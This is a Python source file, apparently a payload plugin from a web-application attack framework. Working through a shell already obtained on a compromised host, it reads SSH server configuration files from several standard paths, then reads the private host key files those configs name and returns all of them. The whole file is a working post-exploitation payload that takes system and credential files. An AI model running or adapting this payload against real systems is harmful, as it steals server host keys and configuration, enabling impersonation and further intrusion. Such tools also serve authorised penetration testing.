import re
from plugins.attack.payloads.base_payload import base_payload

class ssh_config_files(base_payload):
    '''
    This payload shows SSH Server configuration files
    '''
    def api_read(self):
        result = []
        files = []

        def parse_hostkey(config):
            hostkey = re.findall('(?<=HostKey )(.*)', config, re.MULTILINE)
            if hostkey:
                return hostkey
            else:
                return ''

        files.append('/etc/ssh/sshd_config')
        files.append('/etc/rssh.conf')
        files.append('/usr/local/etc/sshd_config')
        files.append('/etc/sshd_config')
        files.append('/etc/openssh/sshd_config')


        for file in files:
            hostkey = parse_hostkey(self.shell.read(file))
            for key in hostkey:
                files.append(key)

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result

    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('SSH configuration files not found.')
        return result
        
